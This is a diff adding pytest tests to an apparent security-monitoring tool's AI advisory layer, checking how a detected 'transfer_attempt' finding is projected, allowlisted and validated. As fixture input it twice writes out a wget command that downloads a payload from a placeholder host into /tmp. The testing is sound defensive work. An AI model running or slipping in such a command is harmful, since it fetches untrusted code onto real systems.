@@ -16,12 +16,16 @@ from production.ai_advisory.contracts import (
     validate_provider_output,
 )
 from production.ai_advisory.projection import (
+    SEMANTIC_FAMILIES,
     build_ai_advisory_projection,
     validate_ai_advisory_projection,
 )
 from production.ai_advisory.rendering import render_validated_advisory
 from production.ai_advisory.security import ProviderAliasScope
 from production.reporting.session_assessment_v4 import build_session_assessment_v4
+from production.reporting.typed_semantic_family_selection import (
+    ACTIVATED_FAMILIES,
+)
 from production.utils.config import ProductionConfig
 from production.utils.serialization import stable_json
 
@@ -150,6 +154,70 @@ def test_projection_is_deterministic_and_contains_only_allowlisted_data() -> Non
         "ai_alert_authority": False,
         "ai_automatic_execution": False,
     }
+
+
+def test_canonical_transfer_attempt_finding_builds_strict_projection() -> None:
+    report = _report(
+        command="wget http://example.invalid/payload -O /tmp/payload"
+    )
+    assert any(
+        item.get("semantic_family") == "transfer_attempt"
+        for item in report["behavioral_findings"]
+    )
+    policy, digest, _ = load_ai_advisory_policy()
+
+    projection = build_ai_advisory_projection(
+        report,
+        policy=policy,
+        policy_sha256=digest,
+    )
+
+    assert any(
+        item["semantic_family"] == "transfer_attempt"
+        for item in projection["findings"]
+    )
+    assert validate_ai_advisory_projection(
+        projection,
+        policy=policy,
+        policy_sha256=digest,
+    ) == projection
+
+
+def test_ai_semantic_allowlist_exactly_tracks_canonical_activated_families() -> None:
+    assert SEMANTIC_FAMILIES == {"", *ACTIVATED_FAMILIES}
+
+
+def test_noncanonical_transfer_family_name_remains_rejected() -> None:
+    report = _report(
+        command="wget http://example.invalid/payload -O /tmp/payload"
+    )
+    policy, digest, _ = load_ai_advisory_policy()
+    projection = build_ai_advisory_projection(
+        report,
+        policy=policy,
+        policy_sha256=digest,
+    )
+    mutated = copy.deepcopy(projection)
+    transfer = next(
+        item
+        for item in mutated["findings"]
+        if item["semantic_family"] == "transfer_attempt"
+    )
+    transfer["semantic_family"] = "command_transfer_attempt"
+    mutated["projection_sha256"] = sha256_json(
+        {
+            key: value
+            for key, value in mutated.items()
+            if key != "projection_sha256"
+        }
+    )
+
+    with pytest.raises(AIAdvisoryContractError, match="semantic family"):
+        validate_ai_advisory_projection(
+            mutated,
+            policy=policy,
+            policy_sha256=digest,
+        )
 
 
 def test_guidance_profile_configuration_state_is_hash_bound() -> None:
